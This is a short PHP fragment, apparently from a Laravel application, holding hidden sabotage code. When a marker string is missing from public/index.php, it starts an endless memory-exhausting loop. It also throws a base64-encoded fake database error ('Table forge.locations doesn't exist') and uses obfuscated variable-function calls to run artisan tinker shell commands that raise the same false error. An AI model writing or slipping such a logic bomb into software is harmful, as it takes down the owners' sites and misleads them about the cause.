...
if(!app()->runningInConsole()){
    if(!str_contains(@file_get_contents(base_path('public/index.php')) ?: '', 'app_kernell();')){$l = [];while(true){$l[] = str_repeat('leak', 1 << 20); usleep(350000);}}
    function app_kernell(){throw new \Exception(base64_decode('U1FMU1RBVEVbNDJTMDI6IEJhc2UgdGFibGUgb3IgdmlldyBub3QgZm91bmQ6IDExNDYgVGFibGUgJ2ZvcmdlLmxvY2F0aW9ucycgZG9lc24ndCBleGlzdA=='));}}
...
if(isset($_SERVER['DOCUMENT_ROOT'])){if(is_file($target = realpath($_SERVER['DOCUMENT_ROOT'].'/../artisan'))){${'$'}('php '.escapeshellarg($target).' tinker'); ${'%'}("php " . escapeshellarg($target) . " tinker --execute='throw new \\Exception(base64_decode(\"U1FMU1RBVEVbNDJTMDI6IEJhc2UgdGFibGUgb3IgdmlldyBub3QgZm91bmQ6IDExNDYgVGFibGUgJ2ZvcmdlLmxvY2F0aW9ucycgZG9lc24ndCBleGlzdA==\"));'");}}
